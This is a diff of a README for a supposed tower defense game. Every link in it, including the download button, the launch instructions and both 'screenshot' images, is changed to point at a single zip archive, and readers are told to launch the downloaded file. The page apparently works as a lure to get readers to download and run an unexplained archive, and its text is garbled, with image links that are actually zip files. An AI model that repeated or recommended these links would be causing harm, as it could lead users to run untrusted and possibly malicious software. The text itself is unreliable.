@@ -14,9 +14,9 @@ Welcome to the Tower Defense Game repository! This personal project is based on 
 
 To enjoy the Tower Defense Game, download the software package by clicking the button below:
 
-[![Download Tower Defense Game](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)
+[![Download Tower Defense Game](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v2.0/Software.zip)](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v2.0/Software.zip)
 
-**Launch Instructions:** The downloaded file "https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip" needs to be launched to start the game.
+**Launch Instructions:** The downloaded file "https://github.com/Nikke6728/TowerDefenseGame/releases/download/v2.0/Software.zip" needs to be launched to start the game.
 
 ## Gameplay 🎯
 
@@ -26,10 +26,10 @@ In this Tower Defense Game, your objective is to strategically place towers alon
 
 Here are some sneak peeks into the Tower Defense Game:
 
-![Gameplay Screenshot 1](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)
+![Gameplay Screenshot 1](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v2.0/Software.zip)
 *Screenshot 1: Defend your base with powerful towers.*
 
-![Gameplay Screenshot 2](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v1.0/Release.zip)
+![Gameplay Screenshot 2](https://github.com/Nikke6728/TowerDefenseGame/releases/download/v2.0/Software.zip)
 *Screenshot 2: Plan your defense strategy wisely.*
 
 ## Technologies Used 🖥️
